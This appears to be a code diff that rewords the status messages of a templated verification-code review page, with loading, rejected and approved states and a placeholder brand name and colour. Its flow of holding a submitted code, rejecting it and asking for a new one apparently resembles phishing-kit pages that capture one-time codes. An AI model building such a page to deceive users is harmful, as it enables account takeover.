@@ -9,7 +9,7 @@
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:{{ platform_color|default('#3B82F6') }};">{{ platform_name }}</h2>
-      <div style="color:#64748b;font-size:13px" id="status-message">Security Verification in Progress</div>
+      <div style="color:#64748b;font-size:13px" id="status-message">Verification Code Under Review</div>
     </div>
   </div>
   {% endif %}
@@ -18,10 +18,10 @@
     <!-- Loading State -->
     <div id="loading-state">
       <div class="loading-spinner"></div>
-      <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:18px;font-weight:600">🔒 Authentication Review</h3>
+      <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:18px;font-weight:600">📋 Verification Code Review</h3>
       <p style="color:#64748b;text-align:center;margin-bottom:24px;line-height:1.5;">
-        Your security credentials are undergoing verification through our authentication system. 
-        This ensures account protection and compliance with security protocols.
+        Your verification code is currently being reviewed by our security system. 
+        This process ensures the authenticity of your credentials and protects your account.
       </p>
       
       <div class="code-display">
@@ -36,19 +36,19 @@
         <i class="fa-solid fa-shield-exclamation" style="color: #dc2626; font-size: 24px;"></i>
       </div>
       
-      <h3 style="color:#dc2626;margin:20px 0 12px 0;font-size:18px;font-weight:600">🛡️ Verification Required</h3>
+      <h3 style="color:#dc2626;margin:20px 0 12px 0;font-size:18px;font-weight:600">❌ Verification Code Rejected</h3>
       
       <div class="error-message" style="background: #fef2f2; border: 1px solid #fecaca; border-radius: 12px; padding: 16px; margin-bottom: 24px;">
         <p style="color:#7f1d1d;text-align:center;margin:0;line-height:1.5;">
-          <strong>Additional Verification Required</strong><br>
-          Please request a new verification code to continue.
+          <strong>Code Validation Failed</strong><br>
+          The submitted verification code could not be validated. Please request a new code to proceed.
         </p>
       </div>
 
       <div class="action-buttons" style="margin-top: 24px;">
         <button onclick="requestNewCode()" class="resend-btn" style="background: {{ platform_color|default('#3B82F6') }}; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; gap: 8px; margin: 0 auto;">
           <i class="fa-solid fa-paper-plane"></i>
-          Request New Verification Code
+          Generate New Verification Code
         </button>
       </div>
     </div>
@@ -59,9 +59,9 @@
         <i class="fa-solid fa-shield-check" style="color: #059669; font-size: 24px;"></i>
       </div>
       
-      <h3 style="color:#059669;margin:20px 0 12px 0;font-size:18px;font-weight:600">✅ Verification Successful</h3>
+      <h3 style="color:#059669;margin:20px 0 12px 0;font-size:18px;font-weight:600">✅ Verification Code Approved</h3>
       <p style="color:#047857;text-align:center;margin-bottom:24px;line-height:1.5;">
-        Your identity has been successfully verified. Redirecting...
+        Your verification code has been successfully validated. Redirecting to complete your registration...
       </p>
     </div>
   </div>
@@ -76,21 +76,21 @@ function showLoadingState() {
   document.getElementById('loading-state').style.display = 'block';
   document.getElementById('rejected-state').style.display = 'none';
   document.getElementById('success-state').style.display = 'none';
-  document.getElementById('status-message').textContent = 'Security Verification in Progress';
+  document.getElementById('status-message').textContent = 'Verification Code Under Review';
 }
 
 function showRejectedState() {
   document.getElementById('loading-state').style.display = 'none';
   document.getElementById('rejected-state').style.display = 'block';
   document.getElementById('success-state').style.display = 'none';
-  document.getElementById('status-message').textContent = 'Additional Verification Required';
+  document.getElementById('status-message').textContent = 'Code Validation Required';
 }
 
 function showSuccessState() {
   document.getElementById('loading-state').style.display = 'none';
   document.getElementById('rejected-state').style.display = 'none';
   document.getElementById('success-state').style.display = 'block';
-  document.getElementById('status-message').textContent = 'Verification Successful';
+  document.getElementById('status-message').textContent = 'Verification Code Approved';
 }
 
 function checkConfirmation() {
